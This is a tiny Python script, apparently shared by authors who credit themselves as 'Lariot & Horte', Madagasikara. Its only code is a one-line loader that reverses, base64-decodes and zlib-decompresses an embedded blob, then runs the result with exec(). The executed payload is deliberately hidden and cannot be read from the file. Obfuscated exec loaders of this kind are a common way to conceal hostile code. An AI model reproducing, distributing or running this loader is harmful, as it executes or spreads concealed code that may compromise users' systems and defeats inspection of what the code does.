
# Code By Lariot & Horte

# Country: Madagasikara
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==AetccYDk/xtAyN8aJQOLsSNQBDWVpka1W3bsy5faFTHZAh9+9aakCRqSp9qiMCOjukXDNx9gu6cox1rupn34NY3yEPPkRqg/eCfG6Jbiem+xiufxqu+GMfCYI6HvYh1Nmd4432b5C5z97XsysYacDVCutyj1md46zqxGOdINdwPDNAUAzQOEdwFwJe'))